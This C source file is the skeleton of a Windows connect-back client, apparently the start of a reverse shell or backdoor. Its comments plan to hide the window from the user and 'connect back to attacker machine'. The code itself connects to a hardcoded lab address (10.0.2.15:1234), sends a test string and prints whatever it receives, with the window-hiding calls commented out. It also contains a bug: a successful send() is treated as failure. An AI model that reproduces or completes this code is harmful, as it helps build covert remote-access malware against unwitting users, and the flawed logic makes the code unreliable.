#undef UNICODE

#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>

// link with Ws2_32.lib
#pragma comment(lib, "Ws2_32.lib")
#define BUFFER_SIZE 1024
#define PORT "1234"
#define ADDRESS "10.0.2.15"

// TODO:
//   1. hide application window from user
//   2. connect back to attacker machine
//   3. maintain the connection allowing data to coninuously flow
//   4. extra functionality stuff
//

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                     LPSTR lpCmdLine, int nShowCmd) {

  SOCKET connect_socket = INVALID_SOCKET;
  ADDRINFO *result = NULL, *ptr = NULL, hints;
  ZeroMemory(&hints, sizeof(hints));
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_protocol = IPPROTO_TCP;
  WSADATA wsa_data_struct;
  int recvbuflen = BUFFER_SIZE, iResult;
  char recvbuf[BUFFER_SIZE];
  const char *test = "this is a test from Windows Client";

  // HWND console_window = GetConsoleWindow();
  // ShowWindow(console_window, SW_HIDE);

  if (WSAStartup(MAKEWORD(2, 2), &wsa_data_struct) != 0) {
    printf("WSAStartup function error\n");
    return 1;
  }
  if (getaddrinfo(ADDRESS, PORT, &hints, &result) != 0) {
    printf("getaddrinfo failed\n");
    return 1;
  }
  ptr = result;
  connect_socket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
  if (connect_socket == INVALID_SOCKET) {
    printf("socket function error: %d\n", WSAGetLastError());
    freeaddrinfo(result);
    WSACleanup();
    return 1;
  }

  if (connect(connect_socket, ptr->ai_addr, (int)ptr->ai_addrlen)) {
    printf("connect function failed\n");
    freeaddrinfo(result);
    WSACleanup();
    return 1;
  }
  if (send(connect_socket, test, (int)strlen(test), 0)) {
    printf("send failed: %d\n", WSAGetLastError());
    closesocket(connect_socket);
    WSACleanup();
    return 1;
  }

  do {
    iResult = recv(connect_socket, recvbuf, recvbuflen, 0);
    if (iResult > 0) {
      printf("Bytes received: %d\n", iResult);
    } else if (iResult == 0) {
      printf("Connection closed\n");
      break;
    } else {
      printf("recv failed: %d\n", WSAGetLastError());
    }
  } while (iResult > 0);

  // shutdown the send half of the connection since no more data will be sent
  iResult = shutdown(connect_socket, SD_SEND);
  if (iResult == SOCKET_ERROR) {
    printf("shutdown failed: %d\n", WSAGetLastError());
    closesocket(connect_socket);
    WSACleanup();
    return 1;
  }
  // cleanup
  closesocket(connect_socket);
  WSACleanup();

  return 0;
}
